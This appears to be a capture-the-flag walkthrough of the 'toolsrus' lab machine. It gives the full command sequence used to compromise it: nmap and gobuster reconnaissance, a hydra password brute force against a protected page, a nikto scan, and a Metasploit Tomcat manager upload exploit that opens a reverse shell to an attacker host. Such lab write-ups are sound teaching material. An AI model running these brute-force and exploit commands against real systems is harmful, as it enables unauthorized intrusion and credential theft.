# toolsrus




# Recon
Like any other room we'll start with a simple nmap scan.
//nmap -sS -Pn toolsrus.thm





Lets enumerate a little more using nmap again to find out more about what's running on those ports.
nmap -sV -sC -p80,1234,8009,22 toolsrus.thm

From our nmap scan we can see 4 ports open, 22 for SSH, 80 for HTTP (Webserver), 1234 for Apache TomCat, and 8009 for ajp13. 
Lets check out the website and see if we can find anything there.


All we get is a header hinting that there may be other subdomains that are up.
Lets do a Gobuster directory bruteforce to find them.
gobuster dir -u http://toolsrus.thm -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,git,env,sql,zip,tgz,pem,key -t 400


You can see we get a lot of results with Status: 403 meaning we don't have access to them except for /guidelines which is also the answer to our first flag.
Hey <b>bob</b>, did you update that TomCat server?
Visiting http://toolsrus.thm/guidelines we find which is the answer to our second flag asking us whose name we find and it is bob.
For our 3rd flag we can take a look at the only webpage with a Status: 401 meaning its: protected.

Taking a look at that protected page I think we can use hydra here. After some research this is the command we have to use.
hydra -f -vV -l bob -P /usr/share/wordlists/rockyou.txt $toolsrus.thm http-get /protected

After 5 seconds and CPU utilization peaking at a whooping 20% we get our password bubbles.

After getting into /protected we find that the page has moved to another port, after trying a couple times, 1234 is what worked.
Here we find Apache Tomcat/7.0.88.
Lets run Gobuster again but on this port.


Now lets use Nikto.
nikto -host http://toolsrus.thm:1234/manager/html

As you can see the server is using Apache/Coyote/1.1 and there's 5 documentations found by Nikto which is more than enough to find an exploit with Metasploit.
msf console
search tomcat type:exploit
I used Metasploit to look for an exploit and after doing some research online we need to use tomcat_mgr_upload.

exploit/multi/http/tomcat_mgr_upload
info
We can use these 2 commands to select the exploit and understand the payload.

Let's set up the arguments we need.
set RHOSTS <YOUR_TARGET_IP>
set RPORT 1234
set HttpUsername bob
set HttpPassword bubbles
set LHOST <YOUR_ATTACKER_IP>
set LPORT 5771
set TARGET 0
Since it's an Apache server we need to set our target to 0 for Java.
Nice! Now we have a meterpreter reverse shell running let's see who we are and our permissions and get our flag!
